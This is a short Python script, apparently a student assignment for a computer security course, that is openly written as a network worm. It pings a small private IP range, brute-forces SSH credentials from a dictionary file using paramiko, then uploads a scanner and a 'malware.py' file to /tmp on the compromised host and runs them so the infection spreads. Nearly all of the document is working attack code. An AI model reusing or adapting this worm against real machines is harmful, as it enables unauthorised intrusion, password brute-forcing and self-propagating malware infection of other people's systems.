# Scan for valid ip addresses within a certain range, brute force ssh into the computer with valid ip, and execute malware on it

import subprocess
import sys
import paramiko
import os

# This function will scan a range of IP addresses and return an active ip address that we can potentially ssh into
def FindFinalIpAddress(ipAddressStart):
    finalIp = ''

    for number in range(2, 8):
        ipAddress = ipAddressStart
        ipAddress += str(number)
        res = subprocess.call(['ping', '-c', '3', ipAddress])

        if res == 0:
            print("****computer with ipaddress ", ipAddress, " is online")
            finalIp = ipAddress
        elif res == 2:
            print("**no response from computer with ipaddress  ", ipAddress)
        else:
            print("**ping failed")

    return finalIp

# this function will get username and password of a computer that is online and return line with username and password
def BruteForceSSH(ipAddress, loginDictionary):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for line in open(loginDictionary, "r").readlines():
        [username, password] = line.strip().split()
        try:
            ssh.connect(ipAddress, username=username, password=password)
        except paramiko.AuthenticationException:
            continue

        print("***Success in breaking in with username ", username, " and password ", password)
        break

    return line

# This function will upload the scanner and malware onto another computer, letting the worm spread and infecting that computer
def UploadAndExecuteMalware(malwareFile, scannerFile):
    sftpClient = ssh.open_sftp()
    sftpClient.put(scannerFile, "/tmp/" + scannerFile)
    ssh.exec_command("python /tmp/" + scannerFile)

    sftpClient.put(malwareFile, "/tmp/" + malwareFile)
    ssh.exec_command("python /tmp/" + malwareFile)

    print('***Successfully loaded malware.py')


print('******Starting worm******')

loginDictionary = '/Users/omarsharif/IdeaProjects/USF/CS 683 (Computer Security)/Project1/venv/loginDictionary'
usernamePassword = ''
ipAddressStart = '192.168.3.'
finalIp = FindFinalIpAddress(ipAddressStart)

usernamePassword = BruteForceSSH(finalIp, loginDictionary)
[username, password] = usernamePassword.strip().split()
print("final username is ", username, " and final password is ", password)
print("final ipaddress is ", finalIp)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(finalIp, username=username, password=password)

UploadAndExecuteMalware('malware.py', 'scanner.py')
ssh.close()
